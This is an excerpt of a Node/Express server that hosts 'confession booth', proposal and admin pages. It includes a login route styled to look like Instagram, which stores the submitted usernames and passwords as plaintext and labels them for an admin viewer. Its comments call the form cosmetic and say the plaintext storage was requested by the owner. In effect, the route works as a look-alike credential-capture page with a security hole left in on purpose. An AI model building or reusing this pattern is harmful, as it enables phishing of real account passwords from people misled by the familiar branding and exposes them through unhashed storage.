...
// NOTE: passwords are stored and compared as plaintext (no hashing) in
// this build, at the request of the project owner.

// Serves confession-booth.html, proposal.html, and admin.html straight from
// this same server — e.g. https://<your-app>.onrender.com/confession-booth.html
// This sidesteps every local file:// / content:// permission headache on a
// phone: the pages are real web pages on a real origin, so a relative link
// like "proposal.html" resolves exactly the way it would on any other website.
...
// ---------------------------------------------------------------------
// Instagram-styled login (cosmetic only).
// This does NOT talk to Instagram at all — no real Instagram account is
// checked or contacted. It's the same username/password system as
// /api/signup and /api/login, just reachable from the Instagram-look
// form on the frontend, and the resulting account is tagged with a
// placeholder instagramId so the admin viewer labels it "instagram".
// Passwords here are stored the same way as /api/signup and /api/login
// (see the note at the top of this file) — this only fakes *which
// service* the login looks like, not how the credentials are stored.
// ---------------------------------------------------------------------
app.post('/api/instagram/mock-login', async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }
  ...
  if (user) {
    if (!user.password) {
      return res.status(401).json({ error: 'That username is already used with a different login method.' });
    }
    const ok = password === user.password;
    if (!ok) {
      return res.status(401).json({ error: 'Incorrect username or password.' });
    ...
    user = await db.createUser({
      username,
      password,
      instagramId: 'mock_' + username.toLowerCase()
    });
  }
